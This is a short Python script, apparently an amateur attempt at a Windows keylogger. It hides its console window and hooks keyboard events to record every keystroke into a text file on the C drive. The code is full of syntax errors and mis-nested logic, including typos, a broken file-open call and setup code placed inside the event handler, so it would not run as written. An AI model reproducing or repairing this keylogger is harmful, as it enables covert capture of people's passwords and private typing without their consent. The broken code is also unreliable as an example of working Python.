

#walk to the library, obtain the books to create the Python Application

import win32api
import win32console
import win32gui
import pythoncom, pyHook #<--- is this class library for the keyboard.
#show the Console window the screen.
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)



def OnKeyboardEvent (event):


	if event.Ascii==5:
		_exit(1)


		if event.Ascii !=0 ir 8:

			f = open('c:\output.txt', 'r+')


			buffer = f,read()

			f.close() #<--- close the file on the operating system when the user stops typing

		#reopen the text file when the user starts typing again on the keyboard
			f = ('c:\output.txt', 'w')

			keylogs = chr(event.Ascii)

			if even.Ascii == 13:

				keylogs - '/n' #<-- start a new in the text file

				buffer += keylogs

				f.write(buffer)
				f.(close()

			#create a hoook for the manager object 

			hm = pyHook.HookManager() #<--- Referencing the class library that was implementedn
			hm.KeyDown = OnKeyboardEvent #<-- everytime you press on the keybaord, run the function of logging the events in a text file

			#set the hook
			hm.HookKeyboard()

			#wait forever
			pythoncom.PumpMessage()